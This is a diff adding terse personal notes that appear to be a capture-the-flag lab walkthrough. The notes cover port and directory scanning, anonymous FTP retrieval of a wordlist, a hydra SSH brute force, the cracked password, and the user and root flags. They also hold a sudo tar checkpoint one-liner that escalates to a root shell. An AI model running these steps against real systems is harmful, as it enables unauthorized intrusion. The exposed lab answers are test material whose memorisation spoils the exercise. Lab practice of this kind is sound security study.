@@ -1,0 +1,35 @@
+sudo nmap -sC -sV -A -T4 -vv -p- 10.10.200.167
+	Agressive mode was needed for this one
+		the -T4 is to run nmap faster
+		three ports are found, 22, 21 and 80
+while running this I also opened the webpage, which worked
+I also ran a gobuster on this one 
+	gobuster dir -u http://10.10.200.167/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+	Immediantely /images shows up
+Lets also see if anonymous can be used to in FTP
+	it can, lets see if we can find anything
+		get the two txt files
+	one shows us what may be a username, Vicious
+		However at the bottom someone named lin signed it
+	The other looks like a password file, lets save that in a nano and use that password file with hydra
+		Lets do both Vicious and lin and use the password file for SSH
+			Lin has a password 
+				RedDr4gonSynd1cat3
+		ssh lin@10.10.200.167
+			RedDr4gonSynd1cat3
+				ls -la
+					we now have user.txt and our first flag
+						THM{CR1M3_SyNd1C4T3}
+	now lets look at out permissions
+		sudo -l
+we can see we can use the bin/tar command, tar allows us to create another remote connection and escalate our privileges
+	sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+		cd /root/
+			ls -la
+				there is root.txt
+			THM{80UN7Y_h4cK3r}
+
+		
+
+	
+
